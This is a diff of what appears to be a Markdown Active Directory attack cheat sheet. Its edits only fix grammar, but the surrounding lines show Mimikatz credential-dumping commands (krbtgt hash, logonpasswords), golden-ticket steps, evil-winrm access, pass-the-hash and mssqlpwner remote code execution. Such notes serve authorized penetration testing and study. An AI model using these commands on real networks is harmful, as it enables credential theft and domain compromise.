@@ -42,7 +42,7 @@ lsadump::lsa /inject /name:krbtgt
 ```
 Take the NTLM hash
 
-Next, get the users SID:
+Next, get the user's SID:
 ```
 whoami /user
 ```
@@ -79,7 +79,7 @@ Get SID
 ```
 whoami /user
 ```
-Next dump the hash as before like the golden ticket attack:
+Next, dump the hash as before, like the golden ticket attack:
 
 ```
 sekurlsa::logonpasswords
@@ -137,7 +137,7 @@ evil-winrm -i TARGET -u USER -p PASSWORD
 
 ## Pass the Hash
 
-Once you get the hash extracted you can also pass them:
+Once you get the hash extracted, you can also pass them:
 
 Impacket:
 ```
@@ -164,7 +164,7 @@ Then cmd here:
 dir \\DC01\c$
 ```
 ## mssqlpwner
-Once you have this bad boy installed, you can rce with hashes or passwords. Command:
+Once you have this bad boy installed, you can RCE mssql with hashes or passwords. Command:
 
 ```
 mssqlpwner user:password@target_ip -windows-auth
@@ -173,6 +173,7 @@ Or pass the hash:
 ```
 mssqlpwner user@target_ip -hashes LMHASH:NTHASH
 ```
+
 ## Tools
 https://www.kali.org/tools/kerberoast/
 
